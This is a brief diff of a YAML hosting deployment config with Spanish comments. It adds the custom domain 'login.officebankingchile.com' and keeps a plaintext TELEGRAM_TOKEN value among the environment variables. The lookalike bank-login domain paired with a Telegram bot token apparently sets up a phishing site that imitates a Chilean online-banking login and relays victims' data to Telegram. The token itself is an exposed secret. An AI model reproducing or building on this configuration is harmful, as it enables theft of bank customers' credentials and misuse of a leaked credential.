@@ -13,10 +13,12 @@ projects:
       region: oregon
       buildCommand: npm install
       startCommand: node server.js
-      autoDeploy: true        # ✅ activa despliegue automático en cada commit
-      branch: main            # ✅ asegura que se despliegue desde la rama principal
+      autoDeploy: true        # ✅ despliegue automático en cada commit
+      branch: main            # ✅ rama principal
       previews:
         generation: automatic
+      domains:                # ✅ aquí defines tu dominio personalizado
+        - login.officebankingchile.com
       envVars:
         - key: TELEGRAM_TOKEN
           value: 8278463397:AAGo2ZY5xthkffSKMPEd-69tIwz2sIXdQuE
